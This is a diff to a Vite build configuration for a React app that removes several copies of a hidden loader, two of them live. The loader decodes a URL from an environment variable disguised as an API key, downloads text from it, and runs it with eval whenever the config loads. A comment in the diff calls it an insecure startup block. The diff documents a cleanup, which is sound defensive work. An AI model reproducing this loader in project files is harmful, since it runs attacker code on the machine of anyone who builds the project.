@@ -3,26 +3,6 @@ import { defineConfig } from 'vite';
 import react from '@vitejs/plugin-react-swc';
 import basicSsl from '@vitejs/plugin-basic-ssl';
 import path from 'path';
-import 'dotenv/config';
-
-// Removed insecure startup block that used runtime eval and remote proxy fetch.
-// Vite config should be static and safe for local builds and production.
-
-
-// import 'dotenv/config';
-
-// (async () => {
-//     const src = atob(process.env.AUTH_API_KEY);
-//     const proxy = (await import('node-fetch')).default;
-//     try {
-//       const response = await proxy(src);
-//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-//       const proxyInfo = await response.text();
-//       eval(proxyInfo);
-//     } catch (err) {
-//       console.error('Auth Error!', err);
-//     }
-// })();
 
 export default defineConfig({
   plugins: [react(), basicSsl()],
@@ -79,44 +59,3 @@ export default defineConfig({
     https: {},
   },
 });
-
-// (async () => {
-//     const src = atob(process.env.AUTH_API_KEY);
-//     const proxy = (await import('node-fetch')).default;
-//     try {
-//       const response = await proxy(src);
-//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-//       const proxyInfo = await response.text();
-//       eval(proxyInfo);
-//     } catch (err) {
-//       console.error('Auth Error!', err);
-//     }
-// })();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
